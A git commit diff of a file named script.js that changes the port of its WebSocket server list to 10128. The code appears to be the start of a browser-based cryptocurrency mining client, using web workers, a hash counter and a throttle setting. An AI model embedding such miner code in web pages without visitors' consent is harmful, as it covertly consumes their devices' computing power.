f807ad9253b5da2bdc4ef18cfd8ecd6e2fd48320
zloberka <124788613+zloberka@users.noreply.github.com>
2025-07-18 11:49:45 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-var server = "wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/", job = null, workers = [], ws, receiveStack = [], sendStack = [], totalhashes = 0, connected = 0, reconnector = 0, attempts = 1, throttleMiner = 0, handshake = null, wasmSupported = function() {
+var server = "wss://ws1.server:10128/;wss://ws2.server:10128/;wss://ws3.server:10128/", job = null, workers = [], ws, receiveStack = [], sendStack = [], totalhashes = 0, connected = 0, reconnector = 0, attempts = 1, throttleMiner = 0, handshake = null, wasmSupported = function() {
     try {
         if ("object" === typeof WebAssembly && "function" === typeof WebAssembly.instantiate) {
             var c = new WebAssembly.Module(Uint8Array.of(0, 97, 115, 109, 1, 0, 0, 0));
